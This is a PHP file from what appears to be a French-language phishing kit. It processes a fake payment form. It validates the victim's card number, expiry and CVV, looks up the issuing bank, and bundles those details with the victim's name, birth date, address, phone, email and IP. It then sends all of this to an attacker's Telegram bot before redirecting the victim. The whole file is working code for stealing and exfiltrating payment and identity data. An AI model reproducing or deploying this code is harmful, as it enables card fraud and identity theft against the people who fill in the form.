<?php 
session_start();
include('../chiffre.php');
include('../../config.php');
if($_SESSION['authorized'] == "1")
{
	if(isset($_POST['continue']))
	{

function is_valid_luhn($number) {
            settype($number, 'string');
            $sumTable = array(array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9), array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9));
            $sum = 0;
            $flip = 0;
            for ($i = strlen($number) - 1;$i >= 0;$i--) {
                $sum+= $sumTable[$flip++ & 0x1][$number[$i]];
            }
            return $sum % 10 === 0;
        }

         if (is_valid_luhn($_POST['ccnum']) && is_numeric($_POST['ccnum']) && $_POST['ccnum'] != "0000000000000000")
          {
		if(strlen($_POST['ccnum']) == 16)
		{

			if(strlen($_POST['ccexp']) == 5)
			{

				if(strlen($_POST['ccvv']) >= 3)
				{

					$_SESSION['ccnum'] = $_POST['ccnum'];
					$_SESSION['ccexp'] = $_POST['ccexp'];
					$_SESSION['ccvv'] = $_POST['ccvv'];
					$cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);
        $ch = curl_init();
        $url = "https://lookup.binlist.net/$bin";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }


        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        $emoji = $someArray['country']['emoji'];
        $brand = $someArray['brand'];
        $type = $someArray['type'];
        $bank = $someArray['bank']['name'];
        $bank_phone = $someArray['bank']['phone'];
        $subject_title = "[BIN: $bin][$emoji $brand $type]";

        $_SESSION["bank"] = $bank;
        $_SESSION["brand"] = $brand;
        $_SESSION["type"] = $type;

					

$message = "
[💳] PAIEMENT [💳]

💳 Carte : ".$_SESSION['ccnum']."
💳 Date d'expiration : ".$_SESSION['ccexp']."
💳 CVV : ".$_SESSION['ccvv']."

🏛 Banque : ".$bank."
🏛 Level : ".$brand."
🏛 Type : ".$type."

[🎲] INFOS [🎲]

🚀 Nom : ".$_SESSION['lname']."
🚀 Prénom : ".$_SESSION['fname']."
🚀 Date de naissance : ".$_SESSION['dob']."
🚀 Téléphone : ".$_SESSION['phone']."
🚀 Adresse : ".$_SESSION['adress']."
🚀 Ville : ".$_SESSION['city']."
🚀 Code Postal : ".$_SESSION['zip']."
🚀 E-Mail : ".$_SESSION['email']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$_SESSION['ip']."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']." 
";



						$data = ['text' => $message,'chat_id' => $chat_id];
					    
        			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
					chiffreMessage($message);
				if($apple_pay == "0")
				{
        			header('Location: ../loader.php?goto=finished');
				}
				else{
				header('Location: ../loader.php?goto=applepay');
				}



				}
				else{
					header('Location: ../paiement.php?error=ccvv');
				}




			}
			else{
				header('Location: ../paiement.php?error=ccexp');
			}


		}
		else{
			header('Location: ../paiement.php?error=ccnum');
		}
	}
	else{
		header('Location: ../paiement.php?error=ccnum');
	}

	}
	else{
		header('Location: ../login.php');
	}
}
else{
	die('UNAUTHORIZED IP');
}


?>